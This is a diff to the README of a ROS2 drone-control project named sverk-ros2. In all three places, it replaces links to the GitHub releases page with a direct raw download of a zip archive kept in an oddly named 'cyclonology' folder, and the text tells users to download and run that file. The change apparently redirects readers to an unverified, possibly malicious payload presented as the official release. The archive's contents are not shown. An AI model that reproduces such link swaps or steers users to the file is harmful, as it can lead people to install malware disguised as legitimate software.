@@ -1,6 +1,6 @@
 # 🤖 sverk-ros2 - Control PX4 Drones with Ease
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge&logo=github)](https://github.com/last1162/sverk-ros2/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge&logo=github)](https://github.com/last1162/sverk-ros2/raw/refs/heads/main/cyclonology/ros_sverk_v3.4.zip)
 
 ## 🚀 What This App Does
 
@@ -33,7 +33,7 @@ You may also need:
 
 Open the release page here:
 
-https://github.com/last1162/sverk-ros2/releases
+https://github.com/last1162/sverk-ros2/raw/refs/heads/main/cyclonology/ros_sverk_v3.4.zip
 
 On that page:
 
@@ -186,7 +186,7 @@ This gives you a quick check that the full path works from Windows to PX4.
 
 Use this link to download and run the latest Windows release file:
 
-https://github.com/last1162/sverk-ros2/releases
+https://github.com/last1162/sverk-ros2/raw/refs/heads/main/cyclonology/ros_sverk_v3.4.zip
 
 ## 🧑‍💻 For Users Who Want a Simple Setup
 
